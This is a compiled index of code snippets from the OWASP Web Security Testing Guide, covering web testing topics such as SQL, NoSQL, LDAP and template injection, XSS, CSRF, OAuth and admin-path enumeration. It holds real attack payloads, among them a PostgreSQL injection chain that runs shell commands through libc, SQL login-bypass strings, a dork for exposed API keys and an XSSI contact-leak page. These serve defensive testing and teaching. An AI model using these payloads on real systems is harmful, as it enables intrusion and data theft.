https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nws://   # Unencrypted WebSocket connection (default port 80)\nwss://  # Encrypted WebSocket connection (default port 443)\n```\n\n----------------------------------------\n\nTITLE: Testing PUT Method in RESTful API\nDESCRIPTION: Demonstrates how to use the PUT method in a RESTful API context to create or update a user object. This is a common usage in modern APIs.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_8\n\nLANGUAGE: http\nCODE:\n```\nPUT /api/users/foo HTTP/1.1\nHost: example.org\nContent-Length: 34\n\n{\n    \"role\": \"user\"\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Special Header Bypass - X-Rewrite-URL\nDESCRIPTION: Request testing support for X-Rewrite-URL header by pointing to non-existent resource.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\nGET / HTTP/1.1\nHost: www.example.com\nX-Rewrite-URL: /donotexist2\n[...]\n```\n\n----------------------------------------\n\nTITLE: Advanced MongoDB Where Clause with Function\nDESCRIPTION: Shows how to use a JavaScript function within MongoDB's $where operator for more complex filtering logic\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ndb.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );\n```\n\n----------------------------------------\n\nTITLE: Google Dorking Query for API Keys\nDESCRIPTION: Example Google search query to find exposed API keys in environment files. This query combines the 'inurl' and 'filetype' operators to locate potentially sensitive credentials.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ninurl:apikey filetype:env\n```\n\n----------------------------------------\n\nTITLE: Vulnerable HTML/JavaScript Implementation with CORS\nDESCRIPTION: Example of vulnerable code that loads content based on URL hash without proper validation, enabling potential XSS attacks. The code uses XMLHttpRequest to fetch and inject content from an unvalidated source into the page.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<script>\n    var req = new XMLHttpRequest();\n\n    req.onreadystatechange = function() {\n        if(req.readyState==4 && req.status==200) {\n            document.getElementById(\"div1\").innerHTML=req.responseText;\n        }\n    }\n\n    var resource = location.hash.substring(1);\n    req.open(\"GET\",resource,true);\n    req.send();\n</script>\n\n<body>\n    <div id=\"div1\"></div>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Receiving Messages Securely with Event Listener in JavaScript\nDESCRIPTION: Example of setting up a message event listener that securely processes messages by validating the origin before handling the data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nwindow.addEventListener(\"message\", handler, true);\nfunction handler(event) {\n    if(event.origin === 'chat.example.com') {\n        /* process message (event.data) */\n    } else {\n        /* ignore messages from untrusted domains */\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PostgreSQL Shell Injection Setup\nDESCRIPTION: SQL commands to create a table and function for shell command execution via libc.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md#2025-04-22_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --\n/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'\nSTRICT --\n/store.php?id=1; SELECT system('uname -a > /tmp/test') --\n/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --\n/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--\n```\n\n----------------------------------------\n\nTITLE: HTTP GET Request Example for Entry Point Testing\nDESCRIPTION: Example of a GET request to an online shopping application showing potential entry points. The request demonstrates parameters passed in the URL query string and via cookies that could be potential attack vectors.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md#2025-04-22_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nGET /shoppingApp/buyme.asp?CUSTOMERID=100&ITEM=z101a&PRICE=62.50&IP=x.x.x.x HTTP/1.1\nHost: x.x.x.x\nCookie: SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy\n```\n\n----------------------------------------\n\nTITLE: Common Template Expression Test Payloads\nDESCRIPTION: These test strings can be used to detect the presence of SSTI vulnerabilities in web applications by testing various template syntax patterns from different template engines.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: text\nCODE:\n```\na{{bar}}b\na{{7*7}}\n{var} ${var} {{var}} <%var%> [% var %]\n```\n\n----------------------------------------\n\nTITLE: Basic SQL Query Example with Injection Point\nDESCRIPTION: This snippet shows a basic SQL query where user input is directly incorporated into the query, creating a potential SQL injection vulnerability. The variable $id represents user-supplied data.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nselect title, text from news where id=$id\n```\n\n----------------------------------------\n\nTITLE: Fuzzing with Wfuzz in Bash\nDESCRIPTION: Example command demonstrating how to use Wfuzz for fuzzing a URL parameter. It uses a wordlist file 'userIDs.txt' to replace the 'FUZZ' placeholder in the target URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/C-Fuzzing.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nwfuzz -w userIDs.txt https://example.com/view_photo?userId=FUZZ\n```\n\n----------------------------------------\n\nTITLE: MySQL Error Message\nDESCRIPTION: Example of an error message returned by MySQL when incorrect SQL syntax is used. These error messages can help attackers identify the database type being used.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_11\n\nLANGUAGE: html\nCODE:\n```\nYou have an error in your SQL syntax; check the manual\nthat corresponds to your MySQL server version for the\nright syntax to use near '\\'\\'' at line 1\n```\n\n----------------------------------------\n\nTITLE: Analyzing Implicit Flow Authorization Request\nDESCRIPTION: Example of an HTTP GET request to the /authorize endpoint using the Implicit Flow. The response_type=token parameter indicates this is using the Implicit Flow which is deprecated in OAuth 2.1.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nGET /authorize\n  ?client_id=<some_client_id>\n  &response_type=token \n  &redirect_uri=https%3A%2F%2Fclient.example.com%2F\n  &scope=openid%20profile%20email\n  &state=<random_state>\n```\n\n----------------------------------------\n\nTITLE: Constructing LDAP Search Filter in Polish Notation\nDESCRIPTION: Examples showing how LDAP search filters are constructed using Polish prefix notation, converting a simple query into LDAP syntax.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\nfind(\"cn=John & userPassword=mypass\")\n```\n\nLANGUAGE: txt\nCODE:\n```\nfind(\"(&(cn=John)(userPassword=mypass))\")\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Phishing Attack URL in Client-side URL Redirect\nDESCRIPTION: This snippet shows an example of a URL that could be used in a phishing attack exploiting a client-side URL redirect vulnerability. The URL contains a redirect parameter that points to a potentially malicious site.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://www.target.site?#redirect=www.fake-target.site\n```\n\n----------------------------------------\n\nTITLE: Using cURL for File Upload with PUT\nDESCRIPTION: Shows how to use cURL to upload a file using the PUT method, which can be used to test for arbitrary file upload vulnerabilities on legacy servers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://example.org --upload-file test.html\n```\n\n----------------------------------------\n\nTITLE: HTTP Request for Session Generation in Authentication Testing\nDESCRIPTION: This code example demonstrates how to create a valid session by submitting user credentials via an HTTP POST request. It shows the format of a login request with username and password parameters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /login HTTP/1.1\nHost: www.example.com\nContent-Length: 32\n\nusername=admin&password=admin123\n```\n\n----------------------------------------\n\nTITLE: Malicious Image Reference in HTML Email\nDESCRIPTION: This HTML snippet demonstrates how an attacker could include a malicious image reference in an HTML email. When rendered, it would trigger a request to the attacker's controlled site, potentially leading to a redirect to the target application.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"https://[attacker]/picture.gif\" width=\"0\" height=\"0\">\n```\n\n----------------------------------------\n\nTITLE: HTML Iframe for Loading SWF in XSS Attack\nDESCRIPTION: HTML code that loads a SWF file directly through an iframe, which can be used in a reflected XSS attack where the browser self-generates an HTML page.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<iframe src='https://victim/path/to/file.swf'></iframe>\n```\n\n----------------------------------------\n\nTITLE: SQL Injection with LIMIT to Return Single Record\nDESCRIPTION: SQL injection technique that uses the LIMIT operator to ensure only one record is returned. This is useful when the application checks that exactly one user record is returned for authentication.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM Users WHERE ((Username='1' or '1' = '1')) LIMIT 1/*') AND (Password=MD5('$password')))\n```\n\n----------------------------------------\n\nTITLE: PostgreSQL Current User Queries\nDESCRIPTION: SQL SELECT statements to retrieve the current user identity in PostgreSQL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md#2025-04-22_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT user\nSELECT current_user\nSELECT session_user\nSELECT usename FROM pg_user\nSELECT getpgusername()\n```\n\n----------------------------------------\n\nTITLE: Legitimate Request/Response Example\nDESCRIPTION: Example of legitimate HTTP request and response when accessing a local profile page through the vulnerable implementation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_7\n\nLANGUAGE: html\nCODE:\n```\nGET /profile.php HTTP/1.1\nHost: example.foo\n[...]\nReferer: https://example.foo/main.php\nConnection: keep-alive\n\nHTTP/1.1 200 OK\n[...]\nContent-Length: 25\nContent-Type: text/html\n\n[Response Body]\n```\n\n----------------------------------------\n\nTITLE: SQL Type Conversion Error Example\nDESCRIPTION: This snippet demonstrates an error message that might be displayed when inserting a string value where a numeric value is expected in a SQL query, which can help attackers identify vulnerable parameters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_3\n\nLANGUAGE: asp\nCODE:\n```\nMicrosoft OLE DB Provider for ODBC Drivers error '80040e07'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the\nvarchar value 'test' to a column of data type int.\n/target/target.asp, line 113\n```\n\n----------------------------------------\n\nTITLE: GraphQL Introspection Response Example\nDESCRIPTION: Sample JSON response from a GraphQL introspection query showing schema information. This shortened example includes the query, mutation, and subscription types, along with enum type definitions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md#2025-04-22_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": {\n    \"__schema\": {\n      \"queryType\": {\n        \"name\": \"Query\"\n      },\n      \"mutationType\": {\n        \"name\": \"Mutation\"\n      },\n      \"subscriptionType\": {\n        \"name\": \"Subscription\"\n      },\n      \"types\": [\n        {\n          \"kind\": \"ENUM\",\n          \"name\": \"__TypeKind\",\n          \"description\": \"An enum describing what kind of type a given __Type is\",\n          \"fields\": null,\n          \"inputFields\": null,\n          \"interfaces\": null,\n          \"enumValues\": [\n            {\n              \"name\": \"SCALAR\",\n              \"description\": \"Indicates this type is a scalar.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n            {\n              \"name\": \"OBJECT\",\n              \"description\": \"Indicates this type is an object. `fields` and `interfaces` are valid fields.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n            {\n              \"name\": \"INTERFACE\",\n              \"description\": \"Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n            {\n              \"name\": \"UNION\",\n              \"description\": \"Indicates this type is a union. `possibleTypes` is a valid field.\",\n              \"isDeprecated\": false,\n              \"deprecationReason\": null\n            },\n          ],\n          \"possibleTypes\": null\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: MS Access System Table Query\nDESCRIPTION: Query to extract table names from MS Access system tables\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md#2025-04-22_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\n' UNION SELECT Name FROM MSysObjects WHERE Type = 1%00\n```\n\n----------------------------------------\n\nTITLE: Redirect Response from Host Header Injection\nDESCRIPTION: An HTTP response showing a 302 redirect that might occur when a server accepts the malicious Host header value, causing a redirect to the attacker's domain.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 302 Found\n[...]\nLocation: https://www.attacker.com/login.php\n\n```\n\n----------------------------------------\n\nTITLE: MS Access Column Enumeration Query\nDESCRIPTION: Query used to enumerate database columns through error messages\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md#2025-04-22_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\n' GROUP BY Id%00\n```\n\n----------------------------------------\n\nTITLE: Example of HTTP Response with Location Header Redirection in HTTP\nDESCRIPTION: This snippet shows a typical HTTP response containing a Location header that causes a browser redirect. This is a common pattern that might be vulnerable to HTTP splitting if user input is incorporated into the header without proper sanitization.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 302 Moved Temporarily\nDate: Sun, 03 Dec 2005 16:22:19 GMT\nLocation: https://victim.com/main.jsp?interface=advanced\n<snip>\n```\n\n----------------------------------------\n\nTITLE: Basic XSS Injection Using Character Codes in JavaScript\nDESCRIPTION: Shows a basic XSS injection technique using JavaScript's String.fromCharCode() method to bypass simple input filters. This method converts Unicode values to their corresponding characters.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/D-Encoded_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<script>alert(String.fromCharCode(88,83,83))</script>\n```\n\n----------------------------------------\n\nTITLE: Testing Price Tampering with Payment IFRAME\nDESCRIPTION: Example HTML IFRAME tag showing how payment gateways can be integrated via IFRAME with URL parameters that might be manipulated to tamper with prices.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<iframe src=\"https://example.org/payment_iframe?merchant_id=123&basket_total=22.00\" />\n```\n\n----------------------------------------\n\nTITLE: Oracle SQL Error Message\nDESCRIPTION: Example of an error message returned by Oracle database when SQL syntax is incorrect. This helps attackers identify that Oracle is the backend database.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nORA-00933: SQL command not properly ended\n```\n\n----------------------------------------\n\nTITLE: OAuth Authorization Request with Redirect URI\nDESCRIPTION: HTTP GET request showing a standard OAuth authorization request with redirect URI and other required parameters\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nGET /authorize\n    ?redirect_uri=http%3A%2F%2Fclient.example.com%2F\n    &client_id=example-client\n    &errorPath=%2Ferror\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=query\n    &state=example\n    &nonce=example\n    &code_challenge=example\n    &code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n```\n\n----------------------------------------\n\nTITLE: Enumerating Tomcat Admin Paths\nDESCRIPTION: Common Tomcat admin paths to check during security assessments. These paths are used to access Tomcat's management and configuration interfaces.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n/manager/html\n/host-manager/html\n/manager/text\n/tomcat-users.xml\n```\n\n----------------------------------------\n\nTITLE: Obscured Server Response Headers\nDESCRIPTION: Example of HTTP response headers from a server with obscured version information\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\nHTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\n...\n```\n\n----------------------------------------\n\nTITLE: HTTP Response for Successful Event Deletion\nDESCRIPTION: HTTP response showing a successful event deletion operation. This is the expected response when an administrator performs the deleteEvent function, which can be used to verify if unauthorized users receive the same response.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md#2025-04-22_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\n[other HTTP headers]\n\n{\"message\": \"Event was deleted\"}\n```\n\n----------------------------------------\n\nTITLE: HTTP 1.1 Cache Control Header Example\nDESCRIPTION: Example of HTTP/1.1 response header using Cache-Control directive to prevent browsers from caching sensitive content. This directive instructs browsers not to store the page content in their cache.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1:\nCache-Control: no-cache\n```\n\n----------------------------------------\n\nTITLE: OAuth CSRF Testing on Consent Page\nDESCRIPTION: POST request example for testing CSRF vulnerability on consent endpoint\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_6\n\nLANGUAGE: http\nCODE:\n```\nPOST /u/consent?state=Tampered_State HTTP/1.1\nHost: as.example.com\n[...]\n\nstate=MODIFY_OR_OMIT_THIS\n&audience=https%3A%2F%2Fas.example.com%2Fuserinfo\n&scope%5B%5D=profile\n&scope%5B%5D=email\n&action=accept\n```\n\n----------------------------------------\n\nTITLE: Leaking Gmail Contacts via JSON in JavaScript\nDESCRIPTION: This snippet demonstrates a historical vulnerability in Gmail that allowed extraction of user contacts in JSON format. The attack overwrites the Array constructor to capture the sensitive data when it's processed by the browser.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <title>Leaking gmail contacts via JSON </title>\n  </head>\n  <body>\n    <script>\n      function Array() {\n        // steal data\n      }\n    </script>\n    <script src=\"https://mail.google.com/mail/?_url_scrubbed_\"></script>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Enumerating WordPress Admin Paths\nDESCRIPTION: Common WordPress admin paths to check during security testing. These are default paths used in WordPress installations for administrative functions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\nwp-admin/\nwp-admin/about.php\nwp-admin/admin-ajax.php\nwp-admin/admin-db.php\nwp-admin/admin-footer.php\nwp-admin/admin-functions.php\nwp-admin/admin-header.php\n```\n\n----------------------------------------\n\nTITLE: Retrieving LinkedIn's security.txt\nDESCRIPTION: Command-line example using wget to download LinkedIn's security.txt file from the .well-known directory and display its contents, demonstrating how to access a site's security policy and vulnerability disclosure information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt && cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -> \"security.txt\" [1]\n\n```\n\n----------------------------------------\n\nTITLE: DOM-Based XSS in User Agent Detection\nDESCRIPTION: A more complex example where the user agent is checked and document.location.href is written to the page for IE browsers, creating a potential DOM-based XSS vulnerability that might be harder to detect with automated tools.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<script>\nvar navAgt = navigator.userAgent;\n\nif (navAgt.indexOf(\"MSIE\")!=-1) {\n        document.write(\"You are using IE as a browser and visiting site: \" + document.location.href + \".\");\n}\nelse\n{\n    document.write(\"You are using an unknown browser.\");\n}\n</script>\n```\n\n----------------------------------------\n\nTITLE: PostgreSQL Error Message\nDESCRIPTION: Example of an error message returned by PostgreSQL when SQL syntax is incorrect. This helps attackers identify that PostgreSQL is being used as the backend database.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_15\n\nLANGUAGE: html\nCODE:\n```\nQuery failed: ERROR: syntax error at or near\n\"'\" at character 56 in /www/site/test.php on line 121.\n```\n\n----------------------------------------\n\nTITLE: Using OpenSSL to Check Client Certificate Requirements\nDESCRIPTION: This command uses OpenSSL's s_client to connect to a server and examine the TLS handshake details, specifically to determine which Certificate Authorities (CAs) are trusted to issue client certificates for authentication purposes.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ openssl s_client -connect example:443\n[...]\nAcceptable client certificate CA names\nC = US, ST = Example, L = Example, O = Example Org, CN = Example Org Root Certificate Authority\nClient Certificate Types: RSA sign, DSA sign, ECDSA sign\n```\n\n----------------------------------------\n\nTITLE: Nmap Scan Results Showing Web Services on Non-Standard Ports\nDESCRIPTION: Sample output from an Nmap scan showing discovered services including HTTP servers on standard and non-standard ports, as well as SSL-wrapped services that need further investigation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nInteresting ports on 192.168.1.100:\n(The 65527 ports scanned but not shown below are in state: closed)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)\n80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))\n443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1\n```\n\n----------------------------------------\n\nTITLE: HTML Rendering in TextField Objects with ActionScript\nDESCRIPTION: This ActionScript code shows how to enable HTML rendering in TextField objects. If user input is not properly sanitized, this could lead to HTML injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_18\n\nLANGUAGE: actionscript\nCODE:\n```\ntf.html = true\ntf.htmlText = '<tag>text</tag>'\n```\n\n----------------------------------------\n\nTITLE: Updated XML Database with New User in XML\nDESCRIPTION: Shows the XML database after a new user node has been added.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n    <user>\n    <username>tony</username>\n    <password>Un6R34kb!e</password>\n    <userid>500</userid>\n    <mail>s4tan@hell.com</mail>\n    </user>\n</users>\n```\n\n----------------------------------------\n\nTITLE: PKCE Downgrade Attack Test Request\nDESCRIPTION: Authorization request for testing PKCE parameter manipulation\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_5\n\nLANGUAGE: http\nCODE:\n```\nGET /authorize\n    ?redirect_uri=http%3A%2F%client.example.com\n    &client_id=example-client\n    &errorPath=%2Ferror\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=web_message\n    &state=example-state\n    &nonce=example-nonce\n    &code_challenge=MODIFY_OR_OMIT_THIS\n    &code_challenge_method=MODIFY_OR_OMIT_THIS\n    &prompt=none HTTP/1.1\nHost: as.example.com\n[...]\n\n```\n\n----------------------------------------\n\nTITLE: Illustrating JavaScript Injection Vulnerability in HTML and JavaScript\nDESCRIPTION: This code demonstrates a vulnerable script within an HTML context that uses the eval() function on user-controllable input, potentially allowing for JavaScript injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<script>\nfunction loadObj(){\n    var cc=eval('('+aMess+')');\n    document.getElementById('mess').textContent=cc.message;\n}\n\nif(window.location.hash.indexOf('message')==-1) {\n    var aMess='({\"message\":\"Hello User!\"})';\n} else {\n    var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8)\n}\n</script>\n```\n\n----------------------------------------\n\nTITLE: Sending Initial GET Request in HTTP\nDESCRIPTION: This snippet shows an example of an initial GET request to a website, which is the first step in testing for session fixation. It demonstrates the basic structure of an HTTP GET request.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nGET / HTTP/1.1\nHost: www.example.com\n```\n\n----------------------------------------\n\nTITLE: Nginx Malformed Request 